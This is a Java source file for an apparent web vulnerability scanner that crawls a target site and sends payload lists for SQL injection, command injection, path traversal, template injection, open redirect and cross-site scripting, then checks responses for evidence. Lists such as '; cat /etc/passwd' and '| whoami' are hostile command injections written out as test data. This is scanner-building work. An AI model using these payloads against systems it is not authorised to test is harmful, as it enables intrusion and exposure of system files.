package com.sentinel.scanner.service;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Queue;
import java.util.Set;
import java.util.UUID;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import com.sentinel.scanner.model.ScanResult;
import com.sentinel.scanner.repository.ScanResultRepository;

/**
 * Enhanced scanning service with improved XSS detection
 */
@Service
public class ScannerService {

    @Autowired
    private ScanResultRepository scanResultRepository;

    @Autowired
    private AuthenticationService authenticationService;

    // SQL Injection payloads - Enhanced
    private static final String[] SQL_PAYLOADS = {
            "'",
            "''",
            "`",
            "1' OR '1'='1",
            "1' OR 1=1--",
            "' OR '1'='1'--",
            "admin'--",
            "' OR 1=1#",
            "1 UNION SELECT 1,2,3--",
            "1' UNION SELECT 1,user(),3--",
            // Boolean based
            "' AND 1=1--",
            "' AND 1=2--",
            "1 AND 1=1",
            "1' AND '1'='1",
            // Time based
            "1' AND SLEEP(5)--",
            "' AND SLEEP(5)--",
            "1 AND SLEEP(5)--",
            "1' waitfor delay '0:0:5'--"
    };

    // Command Injection Payloads
    private static final String[] CMD_PAYLOADS = {
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; ping -c 1 8.8.8.8",
            "| ping -c 1 8.8.8.8",
            "&& ping -c 1 8.8.8.8",
            "| whoami",
            "; whoami"
    };

    // Path Traversal Payloads
    private static final String[] TRAVERSAL_PAYLOADS = {
            "../../etc/passwd",
            "..%2F..%2Fetc%2Fpasswd",
            "..\\..\\windows\\win.ini",
            "../../../etc/passwd"
    };

    // SSTI Payloads
    private static final String[] SSTI_PAYLOADS = {
            "${7*7}",
            "{{7*7}}",
            "<%= 7*7 %>"
    };

    // Open Redirect Payloads
    private static final String[] REDIRECT_PAYLOADS = {
            "http://google.com",
            "//google.com",
            "https://google.com"
    };

    // Enhanced XSS payloads - More aggressive and Polyglot
    private static final String[] XSS_PAYLOADS = {
            "<script>alert(1)</script>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "javascript:alert(1)",
            "'-alert(1)-'",
            "\";alert(1)//",
            // Juice Shop specific / Polyglot
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "<img src=x:alert(alt) onerror=eval(src) alt=alert(1)>"
    };

    // Simple XSS test payloads for reflection check
    private static final String[] SIMPLE_XSS_TESTS = {
            "XSS_TEST_12345",
            "<b>XSS</b>",
            "<i>test</i>",
            "alert(1)"
    };

    // SQL error patterns
    private static final String[] SQL_ERROR_PATTERNS = {
            "sql syntax", "mysql", "mysqli", "sqlstate", "sqlite",
            "postgresql", "ora-", "sqlserver", "odbc", "jdbc",
            "syntax error", "unclosed quotation", "quoted string",
            "you have an error", "warning: mysql", "valid mysql",
            "mysql_fetch", "mysql_num_rows", "pg_query", "database error",
            "sql error", "invalid query", "unexpected end of sql"
    };

    private Map<String, String> cookies = new HashMap<>();

    /**
     * Main scan method
     */
    public Map<String, Object> performScan(String targetUrl) {
        String scanId = UUID.randomUUID().toString().substring(0, 8);
        Map<String, Object> result = new HashMap<>();
        List<ScanResult> vulnerabilities = new ArrayList<>();

        try {
            System.out.println("\n========== STARTING SCAN ==========");
            System.out.println("Target: " + targetUrl);
            System.out.println("Scan ID: " + scanId);

            result.put("scanId", scanId);
            result.put("targetUrl", targetUrl);
            result.put("status", "scanning");

            // Initialize with authentication
            cookies = authenticationService.autoAuthenticate(targetUrl);
            if (cookies.isEmpty()) {
                initializeSession(targetUrl);
            }
            System.out.println("Session initialized with " + cookies.size() + " cookies");

            // Crawl website
            Set<String> discoveredUrls = crawlWebsite(targetUrl);
            result.put("pagesScanned", discoveredUrls.size());
            System.out.println("Discovered " + discoveredUrls.size() + " URLs");

            // Extract forms
            Map<String, List<FormData>> formsMap = extractForms(discoveredUrls);
            int totalForms = formsMap.values().stream().mapToInt(List::size).sum();
            result.put("formsFound", totalForms);
            System.out.println("Found " + totalForms + " forms");

            // Test forms for SQL Injection
            System.out.println("\n--- Testing SQL Injection in Forms ---");
            List<ScanResult> sqlFormResults = testSqlInjectionInForms(formsMap, scanId, targetUrl);
            vulnerabilities.addAll(sqlFormResults);
            System.out.println("SQL Injection found: " + sqlFormResults.size());

            // Test forms for XSS - ENHANCED
            System.out.println("\n--- Testing XSS in Forms ---");
            List<ScanResult> xssFormResults = testXssInForms(formsMap, scanId, targetUrl);
            vulnerabilities.addAll(xssFormResults);
            System.out.println("XSS found in forms: " + xssFormResults.size());

            // Test URL parameters
            List<String> urlsWithParams = extractUrlsWithParameters(discoveredUrls);
            if (!urlsWithParams.isEmpty()) {
                System.out.println("\n--- Testing URL Parameters ---");
                System.out.println("Testing " + urlsWithParams.size() + " URLs with parameters");

                List<ScanResult> sqlUrlResults = testSqlInUrlParams(urlsWithParams, scanId, targetUrl);
                vulnerabilities.addAll(sqlUrlResults);
                System.out.println("SQL Injection in URLs: " + sqlUrlResults.size());

                List<ScanResult> xssUrlResults = testXssInUrlParams(urlsWithParams, scanId, targetUrl);
                vulnerabilities.addAll(xssUrlResults);
                System.out.println("XSS in URLs: " + xssUrlResults.size());
            }

            // Additional risk assessment
            vulnerabilities = assessRiskLevels(vulnerabilities);

            // Save results
            if (!vulnerabilities.isEmpty()) {
                scanResultRepository.saveAll(vulnerabilities);
                System.out.println("\n✓ Saved " + vulnerabilities.size() + " vulnerabilities to database");
            } else {
                System.out.println("\n⚠ No vulnerabilities detected");
            }

            result.put("vulnerabilitiesFound", vulnerabilities.size());
            result.put("vulnerabilities", vulnerabilities);
            result.put("status", "completed");

            // Print summary
            long highRisk = vulnerabilities.stream().filter(v -> "HIGH".equals(v.getRiskLevel())).count();
            long mediumRisk = vulnerabilities.stream().filter(v -> "MEDIUM".equals(v.getRiskLevel())).count();
            long lowRisk = vulnerabilities.stream().filter(v -> "LOW".equals(v.getRiskLevel())).count();

            System.out.println("\n========== SCAN COMPLETE ==========");
            System.out.println("Total Vulnerabilities: " + vulnerabilities.size());
            System.out.println("  HIGH: " + highRisk);
            System.out.println("  MEDIUM: " + mediumRisk);
            System.out.println("  LOW: " + lowRisk);
            System.out.println("===================================\n");

        } catch (Exception e) {
            System.err.println("ERROR during scan: " + e.getMessage());
            e.printStackTrace();
            result.put("status", "error");
            result.put("error", e.getMessage());
        }

        return result;
    }

    /**
     * Assess and adjust risk levels
     */
    private List<ScanResult> assessRiskLevels(List<ScanResult> vulnerabilities) {
        for (ScanResult vuln : vulnerabilities) {
            // XSS in stored context is higher risk
            if ("XSS".equals(vuln.getVulnerabilityType())) {
                if (vuln.getAffectedUrl().contains("stored") || vuln.getAffectedUrl().contains("xss_s")) {
                    vuln.setRiskLevel("HIGH");
                } else {
                    vuln.setRiskLevel("MEDIUM");
                }
            }

            // Basic SQL injection is HIGH
            if ("SQL_INJECTION".equals(vuln.getVulnerabilityType())) {
                vuln.setRiskLevel("HIGH");
            }

            // Add LOW risk for informational findings
            if (vuln.getEvidence().contains("reflected but encoded")) {
                vuln.setRiskLevel("LOW");
            }
        }
        return vulnerabilities;
    }

    /**
     * Initialize session
     */
    private void initializeSession(String targetUrl) {
        try {
            Connection.Response response = Jsoup.connect(targetUrl)
                    .userAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                    .timeout(10000)
                    .followRedirects(true)
                    .execute();
            cookies.putAll(response.cookies());
        } catch (Exception e) {
            System.err.println("Session init failed: " + e.getMessage());
        }
    }

    /**
     * Crawl website
     */
    private Set<String> crawlWebsite(String targetUrl) {
        Set<String> urls = new HashSet<>();
        Queue<String> queue = new LinkedList<>();
        queue.add(targetUrl);
        urls.add(targetUrl);

        String baseDomain = extractDomain(targetUrl);
        int maxPages = 30;

        while (!queue.isEmpty() && urls.size() < maxPages) {
            String currentUrl = queue.poll();
            try {
                Document doc = Jsoup.connect(currentUrl)
                        .userAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                        .cookies(cookies)
                        .timeout(8000)
                        .followRedirects(true)
                        .ignoreHttpErrors(true)
                        .get();

                cookies.putAll(doc.connection().response().cookies());

                Elements links = doc.select("a[href]");
                for (Element link : links) {
                    String absUrl = link.absUrl("href");
                    if (!absUrl.isEmpty() && absUrl.startsWith(baseDomain) && !urls.contains(absUrl)) {
                        if (!absUrl.contains("logout") && !absUrl.startsWith("javascript:")) {
                            urls.add(absUrl);
                            if (urls.size() < maxPages) {
                                queue.add(absUrl);
                            }
                        }
                    }
                }
            } catch (Exception e) {
                // Continue
            }
        }
        return urls;
    }

    /**
     * Extract forms from pages
     */
    private Map<String, List<FormData>> extractForms(Set<String> urls) {
        Map<String, List<FormData>> formsMap = new HashMap<>();

        for (String url : urls) {
            try {
                Document doc = Jsoup.connect(url)
                        .userAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                        .cookies(cookies)
                        .timeout(8000)
                        .ignoreHttpErrors(true)
                        .get();

                Elements forms = doc.select("form");
                List<FormData> formDataList = new ArrayList<>();

                for (Element form : forms) {
                    FormData formData = new FormData();
                    formData.action = form.absUrl("action");
                    if (formData.action.isEmpty()) {
                        formData.action = url;
                    }
                    formData.method = form.attr("method").isEmpty() ? "GET" : form.attr("method").toUpperCase();

                    Elements inputs = form.select("input, textarea, select");
                    for (Element input : inputs) {
                        String name = input.attr("name");
                        String type = input.attr("type").toLowerCase();

                        if (!name.isEmpty() && !type.equals("submit") && !type.equals("button")
                                && !type.equals("reset")) {
                            formData.parameters.put(name, "test");
                        }
                    }

                    if (!formData.parameters.isEmpty()) {
                        formDataList.add(formData);
                    }
                }

                if (!formDataList.isEmpty()) {
                    formsMap.put(url, formDataList);
                }
            } catch (Exception e) {
                // Continue
            }
        }
        return formsMap;
    }

    /**
     * Extract URLs with parameters
     */
    private List<String> extractUrlsWithParameters(Set<String> urls) {
        List<String> result = new ArrayList<>();
        for (String url : urls) {
            if (url.contains("?") && url.contains("=")) {
                result.add(url);
            }
        }
        return result;
    }

    /**
     * Test SQL Injection in forms
     */
    /**
     * Test SQL Injection in forms
     */
    /**
     * Test SQL Injection in forms (Improved Deduplication)
     */
    private List<ScanResult> testSqlInjectionInForms(Map<String, List<FormData>> formsMap, String scanId,
            String targetUrl) {
        List<ScanResult> results = new ArrayList<>();
        Set<String> foundVulnerabilities = new HashSet<>(); // Track unique vulnerabilities

        for (Map.Entry<String, List<FormData>> entry : formsMap.entrySet()) {
            for (FormData form : entry.getValue()) {
                System.out.println("Testing SQL in form: " + form.action);

                // Deduplication Key: Action + Method
                String formKey = form.action + "|" + form.method;
                if (foundVulnerabilities.contains(formKey))
                    continue;

                String baselineResponse = "";
                long baselineTime = 0;
                try {
                    long start = System.currentTimeMillis();
                    baselineResponse = sendFormRequest(form, "test");
                    baselineTime = System.currentTimeMillis() - start;
                } catch (Exception e) {
                    continue;
                }

                for (String payload : SQL_PAYLOADS) {
                    try {
                        long start = System.currentTimeMillis();
                        String response = sendFormRequest(form, payload);
                        long duration = System.currentTimeMillis() - start;

                        // 1. Error-Based Detection
                        if (isSqlVulnerable(response, payload)) {
                            // Double check it's not XSS disguised as SQLi (unlikely but user complained)
                            // For SQLi we look for SQL keywords

                            String evidence = extractSqlEvidence(response);
                            System.out.println("  ✓ SQL Injection (Error-based) FOUND: " + payload);

                            results.add(new ScanResult(
                                    targetUrl, "SQL_INJECTION", form.action, payload, evidence, "HIGH", scanId));
                            foundVulnerabilities.add(formKey);
                            break; // Stop testing this form
                        }

                        // 2. Boolean-Based Detection (Blind)
                        if (payload.contains("AND 1=1")) {
                            String falsePayload = payload.replace("1=1", "1=2");
                            String falseResponse = sendFormRequest(form, falsePayload);

                            boolean trueMatch = isSimilar(response, baselineResponse, 0.90); // Lowered threshold
                                                                                             // slightly
                            boolean falseMatch = isSimilar(falseResponse, baselineResponse, 0.90);

                            if (trueMatch && !falseMatch) {
                                System.out.println("  ✓ Blind SQL Injection (Boolean) FOUND: " + payload);
                                results.add(new ScanResult(
                                        targetUrl, "SQL_INJECTION_BLIND", form.action, payload,
                                        "Response differed significantly between TRUE and FALSE conditions.", "HIGH",
                                        scanId));
                                foundVulnerabilities.add(formKey);
                                break;
                            }
                        }

                        // 3. Time-Based Detection
                        if (payload.toLowerCase().contains("sleep") || payload.toLowerCase().contains("waitfor")) {
                            if (duration > (baselineTime + 4000)) { // If it took > 4 seconds more than baseline
                                System.out.println("  ✓ Blind SQL Injection (Time-based) FOUND: " + payload);
                                results.add(new ScanResult(
                                        targetUrl, "SQL_INJECTION_TIME", form.action, payload,
                                        "Request took " + duration + "ms due to sleep command", "HIGH", scanId));
                                foundVulnerabilities.add(formKey);
                                break;
                            }
                        }

                        Thread.sleep(50);
                    } catch (Exception e) {
                        // Continue
                    }
                }

                // Testing Command Injection
                for (String payload : CMD_PAYLOADS) {
                    try {
                        String response = sendFormRequest(form, payload);
                        if (response.contains("root:x:0:0") || response.contains("INJECTED_EXECUTION")) {
                            System.out.println("  ✓ Command Injection FOUND: " + payload);
                            results.add(new ScanResult(
                                    targetUrl, "COMMAND_INJECTION", form.action, payload,
                                    "System file content or execution marker found", "CRITICAL", scanId));
                            foundVulnerabilities.add(formKey);
                            break;
                        }
                    } catch (Exception e) {
                        // Ignore
                    }
                }
            }
        }
        return results;
    }

    /**
     * Test XSS in forms - ENHANCED with better detection
     */
    private List<ScanResult> testXssInForms(Map<String, List<FormData>> formsMap, String scanId, String targetUrl) {
        List<ScanResult> results = new ArrayList<>();

        for (Map.Entry<String, List<FormData>> entry : formsMap.entrySet()) {
            String pageUrl = entry.getKey();

            for (FormData form : entry.getValue()) {
                System.out.println("Testing XSS in form: " + form.action);

                // First, test with simple payloads to check reflection
                String baselineResponse = "";
                try {
                    baselineResponse = sendFormRequest(form, "test");
                } catch (Exception e) {
                    // Continue
                }

                boolean foundXss = false;

                // Test each XSS payload
                for (String payload : XSS_PAYLOADS) {
                    if (foundXss)
                        break;

                    try {
                        String response = sendFormRequest(form, payload);

                        XssDetectionResult detection = detectXssVulnerability(response, payload, baselineResponse);

                        if (detection.isVulnerable) {
                            System.out.println("  ✓ XSS FOUND with payload: " + payload);
                            System.out.println("    Evidence: " + detection.evidence);

                            ScanResult result = new ScanResult(
                                    targetUrl,
                                    "XSS",
                                    form.action,
                                    payload,
                                    detection.evidence,
                                    detection.riskLevel,
                                    scanId);
                            results.add(result);
                            foundXss = true;
                        }

                        Thread.sleep(50);
                    } catch (Exception e) {
                        // Continue
                    }
                }

                // If no XSS with complex payloads, try simple reflection test
                if (!foundXss) {
                    for (String testPayload : SIMPLE_XSS_TESTS) {
                        try {
                            String response = sendFormRequest(form, testPayload);

                            if (response.contains(testPayload)) {
                                System.out.println("  ℹ Input reflected (potential XSS): " + testPayload);

                                ScanResult result = new ScanResult(
                                        targetUrl,
                                        "XSS",
                                        form.action,
                                        "Input reflection detected with: " + testPayload,
                                        "User input is reflected in the response without proper encoding",
                                        "LOW",
                                        scanId);
                                results.add(result);
                                break;
                            }
                        } catch (Exception e) {
                            // Continue
                        }
                    }
                }
            }
        }
        return results;
    }

    /**
     * Test SQL in URL parameters
     */
    /**
     * Test SQL in URL parameters
     */
    /**
     * Test SQL in URL parameters (Improved Deduplication)
     */
    private List<ScanResult> testSqlInUrlParams(List<String> urls, String scanId, String targetUrl) {
        List<ScanResult> results = new ArrayList<>();
        Set<String> foundVulnerabilities = new HashSet<>();

        for (String url : urls) {
            try {
                String[] parts = url.split("\\?");
                if (parts.length < 2)
                    continue;

                String baseUrl = parts[0];
                String[] params = parts[1].split("&");

                for (String param : params) {
                    String[] kv = param.split("=");
                    if (kv.length < 1)
                        continue;

                    String paramName = kv[0];

                    // Check if we already found SQLi for this param on this base URL
                    String vulnKey = baseUrl + "|" + paramName;
                    if (foundVulnerabilities.contains(vulnKey))
                        continue;

                    System.out.println("Testing SQL in URL param: " + paramName);

                    String baselineResponse = "";
                    long baselineTime = 0;
                    try {
                        long start = System.currentTimeMillis();
                        String baselineUrl = buildTestUrl(baseUrl, params, paramName, "test");
                        baselineResponse = sendGetRequest(baselineUrl);
                        baselineTime = System.currentTimeMillis() - start;
                    } catch (Exception e) {
                        continue;
                    }

                    for (String payload : SQL_PAYLOADS) {
                        try {
                            long start = System.currentTimeMillis();
                            String testUrl = buildTestUrl(baseUrl, params, paramName, payload);
                            String response = sendGetRequest(testUrl);
                            long duration = System.currentTimeMillis() - start;

                            // 1. Error Based
                            if (isSqlVulnerable(response, payload)) {
                                String evidence = extractSqlEvidence(response);
                                System.out.println("  ✓ SQL Injection (Error-based) in URL param: " + paramName);

                                results.add(new ScanResult(
                                        targetUrl, "SQL_INJECTION", url, paramName + "=" + payload, evidence, "HIGH",
                                        scanId));
                                foundVulnerabilities.add(vulnKey);
                                break;
                            }

                            // 2. Boolean Based
                            if (payload.contains("AND 1=1")) {
                                String falsePayload = payload.replace("1=1", "1=2");
                                String falseUrl = buildTestUrl(baseUrl, params, paramName, falsePayload);
                                String falseResponse = sendGetRequest(falseUrl);

                                boolean trueMatch = isSimilar(response, baselineResponse, 0.90);
                                boolean falseMatch = isSimilar(falseResponse, baselineResponse, 0.90);

                                if (trueMatch && !falseMatch) {
                                    System.out.println("  ✓ Blind SQL Injection (Boolean) in URL param: " + paramName);
                                    results.add(new ScanResult(
                                            targetUrl, "SQL_INJECTION_BLIND", url, paramName + "=" + payload,
                                            "Boolean inference successful", "HIGH", scanId));
                                    foundVulnerabilities.add(vulnKey);
                                    break;
                                }
                            }

                            // 3. Time Based Detection
                            if (payload.toLowerCase().contains("sleep") || payload.toLowerCase().contains("waitfor")) {
                                if (duration > (baselineTime + 4000)) {
                                    System.out
                                            .println("  ✓ Blind SQL Injection (Time-based) in URL param: " + paramName);
                                    results.add(new ScanResult(
                                            targetUrl, "SQL_INJECTION_TIME", url, paramName + "=" + payload,
                                            "Request took " + duration + "ms due to sleep command", "HIGH", scanId));
                                    foundVulnerabilities.add(vulnKey);
                                    break;
                                }
                            }

                            Thread.sleep(50);
                        } catch (Exception e) {
                            // Continue
                        }
                    }

                    // 4. Test Path Traversal
                    for (String payload : TRAVERSAL_PAYLOADS) {
                        try {
                            String testUrl = buildTestUrl(baseUrl, params, paramName, payload);
                            String response = sendGetRequest(testUrl);

                            if (response.contains("root:x:0:0") || response.contains("[fonts]")) {
                                System.out.println("  ✓ Path Traversal FOUND: " + paramName);
                                results.add(new ScanResult(
                                        targetUrl, "PATH_TRAVERSAL", testUrl, payload,
                                        "System file content found in response", "CRITICAL", scanId));
                                break;
                            }
                        } catch (Exception e) {
                        }
                    }

                    // 5. Test SSTI
                    for (String payload : SSTI_PAYLOADS) {
                        try {
                            String testUrl = buildTestUrl(baseUrl, params, paramName, payload);
                            String response = sendGetRequest(testUrl);

                            if (response.contains("Hello 49") || response.contains("49")) {
                                System.out.println("  ✓ SSTI FOUND: " + paramName);
                                results.add(new ScanResult(
                                        targetUrl, "SSTI", testUrl, payload,
                                        "Template engine executed mathematical expression (7*7=49)", "HIGH", scanId));
                                break;
                            }
                        } catch (Exception e) {
                        }
                    }

                    // 6. Test Open Redirect
                    for (String payload : REDIRECT_PAYLOADS) {
                        try {
                            String testUrl = buildTestUrl(baseUrl, params, paramName, payload);
                            // Need to disable redirect following for this check
                            Connection.Response response = Jsoup.connect(testUrl)
                                    .followRedirects(false)
                                    .ignoreHttpErrors(true)
                                    .execute();

                            if (response.hasHeader("Location") && response.header("Location").contains("google.com")) {
                                System.out.println("  ✓ Open Redirect FOUND: " + paramName);
                                results.add(new ScanResult(
                                        targetUrl, "OPEN_REDIRECT", testUrl, payload,
                                        "Server redirected to external domain", "MEDIUM", scanId));
                                break;
                            }
                        } catch (Exception e) {
                        }
                    }
                }
            } catch (Exception e) {
                // Continue
            }
        }
        return results;
    }

    /**
     * Test XSS in URL parameters - ENHANCED
     */
    private List<ScanResult> testXssInUrlParams(List<String> urls, String scanId, String targetUrl) {
        List<ScanResult> results = new ArrayList<>();

        for (String url : urls) {
            try {
                String[] parts = url.split("\\?");
                if (parts.length < 2)
                    continue;

                String baseUrl = parts[0];
                String[] params = parts[1].split("&");

                for (String param : params) {
                    String[] kv = param.split("=");
                    if (kv.length < 1)
                        continue;

                    String paramName = kv[0];
                    System.out.println("Testing XSS in URL param: " + paramName);

                    // Get baseline
                    String baselineResponse = "";
                    try {
                        String baselineUrl = buildTestUrl(baseUrl, params, paramName, "test");
                        baselineResponse = sendGetRequest(baselineUrl);
                    } catch (Exception e) {
                        // Continue
                    }

                    boolean foundXss = false;

                    for (String payload : XSS_PAYLOADS) {
                        if (foundXss)
                            break;

                        try {
                            String testUrl = buildTestUrl(baseUrl, params, paramName, payload);
                            String response = sendGetRequest(testUrl);

                            XssDetectionResult detection = detectXssVulnerability(response, payload, baselineResponse);

                            if (detection.isVulnerable) {
                                System.out.println("  ✓ XSS in URL param: " + paramName);

                                ScanResult result = new ScanResult(
                                        targetUrl,
                                        "XSS",
                                        url,
                                        paramName + "=" + payload,
                                        detection.evidence,
                                        detection.riskLevel,
                                        scanId);
                                results.add(result);
                                foundXss = true;
                            }

                            Thread.sleep(50);
                        } catch (Exception e) {
                            // Continue
                        }
                    }

                    // Simple reflection test
                    if (!foundXss) {
                        for (String testPayload : SIMPLE_XSS_TESTS) {
                            try {
                                String testUrl = buildTestUrl(baseUrl, params, paramName, testPayload);
                                String response = sendGetRequest(testUrl);

                                if (response.contains(testPayload)) {
                                    System.out.println("  ℹ Input reflected in URL param: " + paramName);

                                    ScanResult result = new ScanResult(
                                            targetUrl,
                                            "XSS",
                                            url,
                                            paramName + "=" + testPayload,
                                            "Parameter value reflected without encoding",
                                            "LOW",
                                            scanId);
                                    results.add(result);
                                    break;
                                }
                            } catch (Exception e) {
                                // Continue
                            }
                        }
                    }
                }
            } catch (Exception e) {
                // Continue
            }
        }
        return results;
    }

    /**
     * Enhanced XSS detection with multiple checks
     */
    /**
     * Enhanced XSS detection with multiple checks
     */
    private XssDetectionResult detectXssVulnerability(String response, String payload, String baseline) {
        XssDetectionResult result = new XssDetectionResult();
        result.isVulnerable = false;
        result.riskLevel = "MEDIUM";
        result.evidence = "";

        // Check 1: Direct payload reflection (no encoding)
        if (response.contains(payload)) {
            result.isVulnerable = true;
            result.evidence = "Payload reflected without any encoding: " + payload;
            result.riskLevel = "HIGH"; // Direct reflection is usually High
            return result;
        }

        // Check 2: Case-insensitive match for script tags
        String lowerResponse = response.toLowerCase();
        String lowerPayload = payload.toLowerCase();

        if (lowerPayload.contains("<script") && lowerResponse.contains("<script")) {
            // Check if it's our script
            if (response.contains("<script>alert(1)</script>") || response.contains("<ScRiPt>alert(1)</ScRiPt>")) {
                result.isVulnerable = true;
                result.evidence = "Script tag with alert function found in response";
                result.riskLevel = "HIGH";
                return result;
            }
        }

        // Check 3: Event handler reflection
        String[] eventHandlers = { "onerror", "onload", "onfocus", "onmouseover", "onclick", "ontoggle", "onstart" };
        for (String handler : eventHandlers) {
            String handlerPattern = handler + "=";
            if (payload.toLowerCase().contains(handlerPattern)) {
                // False Positive Fix:
                // If the payload relies on a tag (e.g. <img...), verify the tag is unescaped.
                // We do this by extracting the tag name (e.g. "img") and checking if "<img"
                // exists in response.
                if (payload.contains("<")) {
                    int tagStart = payload.indexOf("<") + 1;
                    int tagEnd = payload.indexOf(" ", tagStart);
                    if (tagEnd == -1)
                        tagEnd = payload.indexOf(">", tagStart);

                    if (tagEnd > tagStart) {
                        String tagName = payload.substring(tagStart, tagEnd).toLowerCase();
                        // If the response does not contain "<tagName" (e.g. "<img"), it's likely
                        // escaped to "&lt;img"
                        if (!lowerResponse.contains("<" + tagName)) {
                            continue;
                        }
                    }
                }

                // If the handler is reflected
                if (lowerResponse.contains(handler + "=alert(1)") || lowerResponse.contains(handler + "=alert()")) {
                    result.isVulnerable = true;
                    result.evidence = "Event handler (" + handler + ") reflected with valid context";
                    result.riskLevel = "HIGH";
                    return result;
                }
            }
        }

        // Check 4: Partial payload reflection (without encoding) - Context Matters
        if (payload.contains("<") && payload.contains(">")) {
            String innerContent = payload.replaceAll("<[^>]*>", "");
            // If inner content is reflected AND tags are around
            if (innerContent.length() > 3 && response.contains(innerContent)) {
                // Weak check, but improved: look for unescaped < or > near the content
                int idx = response.indexOf(innerContent);
                if (idx > 1 && (response.charAt(idx - 1) == '>' || response.charAt(idx - 1) == '"'
                        || response.charAt(idx - 1) == '\'')) {
                    // Potential breakout
                }
            }
        }

        // Check 5: JavaScript protocol
        if (payload.toLowerCase().contains("javascript:") && lowerResponse.contains("javascript:alert(1)")) {
            result.isVulnerable = true;
            result.evidence = "JavaScript protocol handler reflected in response";
            result.riskLevel = "HIGH";
            return result;
        }

        // Check 6: Juice Shop specific (object Object reflection or angular)
        if (response.contains("[object Object]") && payload.contains("toString")) {
            result.isVulnerable = true;
            result.evidence = "Potential Template Injection or Prototype Pollution reflection";
            result.riskLevel = "MEDIUM";
            return result;
        }

        return result;
    }

    /**
     * Calculate string similarity (0.0 to 1.0)
     * Simple Levenshtein-based ratio or just Length ratio for performance
     */
    private boolean isSimilar(String s1, String s2, double threshold) {
        if (s1 == null || s2 == null)
            return false;

        // Rapid fail: Length difference > 20% likely different
        double lenDiff = Math.abs(s1.length() - s2.length());
        if (lenDiff / Math.max(s1.length(), s2.length()) > (1 - threshold)) {
            return false;
        }

        // Calculate similarity based on Levenshtein distance
        int distance = levenshteinDistance(s1, s2);
        int maxLength = Math.max(s1.length(), s2.length());
        if (maxLength == 0)
            return true;

        double similarity = 1.0 - ((double) distance / maxLength);
        return similarity >= threshold;
    }

    private int levenshteinDistance(String s1, String s2) {
        // Optimization: if diff is too big just return huge
        if (Math.abs(s1.length() - s2.length()) > 500)
            return 1000;

        int[][] dp = new int[s1.length() + 1][s2.length() + 1];

        for (int i = 0; i <= s1.length(); i++)
            dp[i][0] = i;
        for (int j = 0; j <= s2.length(); j++)
            dp[0][j] = j;

        for (int i = 1; i <= s1.length(); i++) {
            for (int j = 1; j <= s2.length(); j++) {
                int cost = (s1.charAt(i - 1) == s2.charAt(j - 1)) ? 0 : 1;
                dp[i][j] = Math.min(
                        Math.min(dp[i - 1][j] + 1, dp[i][j - 1] + 1),
                        dp[i - 1][j - 1] + cost);
            }
        }
        return dp[s1.length()][s2.length()];
    }

    /**
     * Build test URL with payload
     */
    private String buildTestUrl(String baseUrl, String[] params, String targetParam, String payload) throws Exception {
        StringBuilder url = new StringBuilder(baseUrl + "?");
        for (String p : params) {
            String[] kv = p.split("=");
            if (kv[0].equals(targetParam)) {
                url.append(kv[0]).append("=").append(URLEncoder.encode(payload, "UTF-8"));
            } else {
                url.append(p);
            }
            url.append("&");
        }
        return url.toString();
    }

    /**
     * Send form request
     */
    private String sendFormRequest(FormData form, String payload) throws Exception {
        Connection connection = Jsoup.connect(form.action)
                .userAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                .cookies(cookies)
                .timeout(8000)
                .followRedirects(true)
                .ignoreHttpErrors(true)
                .ignoreContentType(true);

        // Add all parameters with payload
        for (Map.Entry<String, String> param : form.parameters.entrySet()) {
            connection.data(param.getKey(), payload);
        }

        Connection.Response response;
        if ("POST".equalsIgnoreCase(form.method)) {
            response = connection.method(Connection.Method.POST).execute();
        } else {
            response = connection.method(Connection.Method.GET).execute();
        }

        cookies.putAll(response.cookies());
        return response.body();
    }

    /**
     * Send GET request
     */
    private String sendGetRequest(String url) throws Exception {
        Connection.Response response = Jsoup.connect(url)
                .userAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                .cookies(cookies)
                .timeout(8000)
                .followRedirects(true)
                .ignoreHttpErrors(true)
                .ignoreContentType(true)
                .execute();

        cookies.putAll(response.cookies());
        return response.body();
    }

    /**
     * Check if SQL vulnerable
     */
    private boolean isSqlVulnerable(String response, String payload) {
        String lowerResponse = response.toLowerCase();

        for (String pattern : SQL_ERROR_PATTERNS) {
            if (lowerResponse.contains(pattern.toLowerCase())) {
                return true;
            }
        }

        if (lowerResponse.contains("syntax") && (lowerResponse.contains("sql") || lowerResponse.contains("query"))) {
            return true;
        }

        // Removed weak heuristic that caused False Positives for XSS reflection
        return false;
    }

    /**
     * Extract SQL evidence
     */
    private String extractSqlEvidence(String response) {
        String lowerResponse = response.toLowerCase();

        for (String pattern : SQL_ERROR_PATTERNS) {
            int index = lowerResponse.indexOf(pattern.toLowerCase());
            if (index != -1) {
                int start = Math.max(0, index - 50);
                int end = Math.min(response.length(), index + 150);
                return "..." + response.substring(start, end) + "...";
            }
        }

        return "SQL error pattern detected in response";
    }

    /**
     * Extract domain from URL
     */
    /**
     * Extract domain from URL
     */
    private String extractDomain(String url) {
        try {
            // Handle localhost and IP addresses correctly
            if (url.contains("://")) {
                String[] parts = url.split("://");
                String protocol = parts[0];
                String rest = parts[1];

                // Get strictly the host + port part
                String host;
                if (rest.contains("/")) {
                    host = rest.substring(0, rest.indexOf("/"));
                } else {
                    host = rest;
                }

                // For localhost/127.0.0.1, we must include the protocol to match absUrl
                return protocol + "://" + host;
            }
        } catch (Exception e) {
